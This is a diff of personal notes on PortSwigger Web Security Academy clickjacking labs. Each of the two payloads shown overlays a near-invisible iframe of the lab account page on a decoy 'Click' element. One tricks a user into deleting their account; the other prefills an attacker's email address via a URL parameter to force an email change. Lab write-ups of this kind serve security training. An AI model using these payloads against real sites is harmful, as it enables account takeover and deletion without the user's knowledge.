@@ -19,33 +19,23 @@ we have to make a decoy website aligning the delete key exactly for the ```click
 
 ***payload***
 ```
-<head>
-	<style>
-		#target_website {
-			position:relative;
-			width:700px;
-			height:700px;
-			opacity: 0.1;
-			z-index:2;
-                        border: none;
-			}
-		#decoy_website {
-			position:absolute;
-                        left: 100px;
-                        top: 560px;
-			                  width:700;
-                        height:700;
-			z-index:1;
-			}
-	</style>
-</head>
-<body>
-	<div id="decoy_website">
-	click
-	</div>
-	<iframe id="target_website" src="https://0acf002904a9e07787f7d367007a006d.web-security-academy.net/my-account">
-	</iframe>
-</body>
+<style>
+    iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.00001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:520px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click</div>
+<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account"></iframe>
 ```
 
 i)  made the <div> element of decoy element and the target site of same size so they both get alligned perfectly.
@@ -53,3 +43,36 @@ ii) then changed the position of the text "click" to the match the decoy site's 
 
 
 ## LAB-2
+
+***Clickjacking with form input data prefilled from a URL parameter***
+
+```parameter - email```
+
+this parameter fills the data into the email box. like any data passed to this parameter is reflected in this update email field. so passing this parameter value with the mail that the attacker want to set and uses clickjacking to make the user to submit it.
+
+
+**payload**
+```
+<style>
+    iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.00001;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:520px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
+```
+
+
+## LAB-3
+
+
